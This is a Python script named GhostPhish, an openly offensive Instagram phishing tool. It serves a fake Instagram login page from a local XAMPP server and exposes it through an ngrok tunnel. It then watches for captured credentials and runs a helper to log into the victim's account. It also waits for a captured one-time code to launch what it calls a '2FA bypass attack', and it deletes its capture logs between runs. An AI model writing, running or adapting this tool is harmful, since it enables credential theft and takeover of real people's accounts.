import itertools
import sys
import os
import json
import requests
from time import sleep
from colorama import init
from termcolor import colored
from login import WriteURL

def restart_program():
    """Restarts the current program, with file objects and descriptors
       cleanup
    """

    try:
        p = psutil.Process(os.getpid())
        for handler in p.get_open_files() + p.connections():
            os.close(handler.fd)
    except Exception as e:
        logging.error(e)

    python = sys.executable
    os.execl(python, python, "\"{}\"".format(sys.argv[0]))

def Clean():
	try:
		os.remove('D:/xampp/htdocs/instagram/accounts/login/&source=auth_switcher/data.txt')
		os.remove('D:/xampp/htdocs/instagram/scripts/log.txt')
		os.remove('D:/xampp/htdocs/instagram/accounts/login/&source=auth_switcher/url.txt')
		os.remove('D:/xampp/htdocs/instagram/accounts/login/two_factor&source=auth_switcher&next/otp.txt')
	except:
		junk=1

def check_internet():
    url='http://www.google.com/'
    timeout=5
    try:
        _ = requests.get(url, timeout=timeout)
        success_box('Connection successful')
    except requests.ConnectionError:
        failure_box("Connection failed. Connect to internet to continue...")
        sys.exit()

def failure_box(text):
	init ()
	print(colored(' [','white') + colored('×','red') + colored('] ','white') + text)

def success_box(text):
	init ()
	print(colored(' [','white') + colored('+','green') + colored('] ','white') + text)

def get_ngrok_url():
    url = "http://localhost:4040/api/tunnels"
    res = requests.get(url)
    res_unicode = res.content.decode("utf-8")
    res_json = json.loads(res_unicode)
    ngrok_url = res_json["tunnels"][0]["public_url"]
    return ngrok_url

def ShowBanner():
	os.system('cls')
	size = os.get_terminal_size().columns
	print('')
	print(colored(' ██████╗ ██╗  ██╗ ██████╗ ███████╗████████╗██████╗ ██╗  ██╗██╗███████╗██╗  ██╗','white').center(size))
	print(colored('██╔════╝ ██║  ██║██╔═══██╗██╔════╝╚══██╔══╝██╔══██╗██║  ██║██║██╔════╝██║  ██║','white').center(size))
	print(colored('██║  ███╗███████║██║   ██║███████╗   ██║   ██████╔╝███████║██║███████╗███████║','white').center(size))
	print(colored('██║   ██║██╔══██║██║   ██║╚════██║   ██║   ██╔═══╝ ██╔══██║██║╚════██║██╔══██║','white').center(size))
	print(colored('╚██████╔╝██║  ██║╚██████╔╝███████║   ██║   ██║     ██║  ██║██║███████║██║  ██║','white').center(size))
	print(colored(' ╚═════╝ ╚═╝  ╚═╝ ╚═════╝ ╚══════╝   ╚═╝   ╚═╝     ╚═╝  ╚═╝╚═╝╚══════╝╚═╝  ╚═╝','white').center(size))
	print(colored('By Mr.4N0NYM4U5','green').center(size))
	print('')
	
if __name__ == '__main__':
	if(len(sys.argv)!=2):
		print('Usage : python GhostPhish.py --headless / --start-maximised')
		sys.exit()
	else:
		pass
	
	ShowBanner() 
	check_internet()
	Clean()
	os.system('start /min D:/xampp/apache_start.bat')
	os.system('start /min D:/xampp/mysql_start.bat')
	os.system('start /min ngrok.exe http 80')
	sleep(5)
	ngrok_url=get_ngrok_url()
	success_box('ngrok : ' + ngrok_url + '/instagram/accounts/login/&source=auth_switcher/')
	WriteURL(ngrok_url)
	Phish=True
	while Phish is True:
		for x in itertools.repeat(1):
			try:
			 	if (os.path.exists('D:/xampp/htdocs/instagram/accounts/login/&source=auth_switcher/data.txt') is True):
			 		success_box("Launching the phishing attack...")
			 		os.system("python login.py %s" % sys.argv[1])
			 		break
			 	else:
			 		continue
			except:
			 	pass
		
		with open('D:/xampp/htdocs/instagram/scripts/log.txt','r') as f:
			text=f.readlines()
			text=list(text)
			log_in_status=text[2]
			f.close()
		
		log_in_status=int(log_in_status)

		if(log_in_status == 0):
			os.system('python GhostPhish.py ' + sys.argv[1])
			break

		elif(log_in_status == 1):
			success_box('Have Fun...')
			Phish=False
			break

		elif(log_in_status == 2):
			Phish=True
			
		for x in itertools.repeat(1):
				try:
				 	if (os.path.exists('D:/xampp/htdocs/instagram/accounts/login/two_factor&source=auth_switcher&next/otp.txt') is True):
				 		success_box('Launching the 2FA bypass attack...')
				 		otp_phish = os.system('python two_factor_auth.py')
				 		break
				 	else:
				 		continue
				except:
				 	pass
		sys.exit()